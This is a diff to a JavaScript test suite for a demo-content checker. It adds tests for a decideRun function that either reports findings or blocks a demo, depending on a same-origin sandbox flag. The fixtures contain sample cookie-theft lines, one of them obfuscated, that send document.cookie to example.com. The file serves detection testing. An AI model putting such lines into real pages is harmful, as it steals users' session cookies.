@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 
-import { checkDemoContent, describeContentReport } from '../browser/checkDemoContent.js';
+import { checkDemoContent, decideRun, describeContentReport } from '../browser/checkDemoContent.js';
 
 describe('checkDemoContent: what a demo does, before it runs', () => {
   it('passes a demo that only uses the shim layer', () => {
@@ -74,5 +74,38 @@ fn('https://example.com/?x=' + document['coo' + 'kie']);
     assert.equal(checkDemoContent({}).checked, 0);
     assert.equal(checkDemoContent({ 'x.js': {} }).checked, 0);
     assert.equal(checkDemoContent(undefined).ok, true);
+  });
+});
+
+describe('decideRun: the posture decides whether findings are information or a gate', () => {
+  const clean = checkDemoContent({ 'demo.js': 'const a = 1;\n' });
+  const dirty = checkDemoContent({ 'demo.js': "fetch('https://example.com/?c=' + document.cookie);\n" });
+
+  it('lets a clean demo run in either posture', () => {
+    assert.equal(decideRun({ report: clean, sameOriginSandbox: false }).allow, true);
+    assert.equal(decideRun({ report: clean, sameOriginSandbox: true }).allow, true);
+  });
+
+  it('reports findings as information when the sandbox has its own origin', () => {
+    const decision = decideRun({ report: dirty, sameOriginSandbox: false });
+    assert.equal(decision.allow, true);
+    assert.match(decision.reason, /the browser is the boundary/);
+    assert.match(decision.reason, /2 finding\(s\) for review/);
+  });
+
+  it('blocks on findings when the sandbox is on this origin by opt-in', () => {
+    const decision = decideRun({ report: dirty, sameOriginSandbox: true });
+    assert.equal(decision.allow, false);
+    assert.match(decision.reason, /same-origin opt-in/);
+    assert.match(decision.reason, /demo\.js:1 network-fetch/);
+  });
+
+  it('takes the posture as given, never inferred', () => {
+    // The point of the flag: the same report and the same files decide differently only because the posture was
+    // configured. Nothing about a url or a hostname is consulted here.
+    assert.notEqual(
+      decideRun({ report: dirty, sameOriginSandbox: true }).allow,
+      decideRun({ report: dirty, sameOriginSandbox: false }).allow,
+    );
   });
 });
